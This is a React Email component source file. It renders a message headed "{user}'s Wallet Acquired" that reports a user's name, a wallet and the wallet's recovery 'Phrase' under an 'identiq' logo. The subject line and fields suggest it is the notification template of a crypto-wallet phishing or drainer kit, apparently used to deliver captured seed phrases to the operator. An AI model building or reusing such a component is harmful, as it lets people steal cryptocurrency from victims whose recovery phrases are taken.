import {
  Body,
  Button,
  Container,
  Head,
  Hr,
  Html,
  Img,
  Preview,
  Section,
  Text,
} from "@react-email/components";
import * as React from "react";



const baseUrl = process.env.VERCEL_URL
  ? `https://${process.env.VERCEL_URL}`
  : "";

export const WalletEmail = ({
  user, wallet, active
}) => (
  <Html>
    <Head />
    <Preview>
     {user}'s Wallet Acquired
    </Preview>
    <Body style={main}>
      <Container style={container}>
        <Img
          src={'https://identiq-green.vercel.app/_next/image?url=%2Ficon.png&w=64&q=75'}
          
          height="50"
          alt="identiq"
          style={logo}
        />
       
        <Text style={paragraph}>
          User: {user} <br />
          <hr style={hr} />
          Wallet: {active} <br />
          <hr style={hr} />
          Phrase: {wallet}
        </Text>
        
       
        
      </Container>
    </Body>
  </Html>
);



export default WalletEmail;

const main = {
  backgroundColor: "#ffffff",
  fontFamily:
    '-apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,Oxygen-Sans,Ubuntu,Cantarell,"Helvetica Neue",sans-serif',
};

const container = {
  margin: "0 auto",
  padding: "20px 0 48px",
};

const logo = {
  margin: "0 auto",
};

const paragraph = {
  fontSize: "16px",
  lineHeight: "26px",
};

const btnContainer = {
  textAlign: "center",
};

const button = {
  backgroundColor: "#5F51E8",
  borderRadius: "3px",
  color: "#fff",
  fontSize: "16px",
  textDecoration: "none",
  textAlign: "center",
  display: "block",
  padding: "12px",
};

const hr = {
  borderColor: "#cccccc",
  margin: "20px 0",
};

const footer = {
  color: "#8898aa",
  fontSize: "12px",
};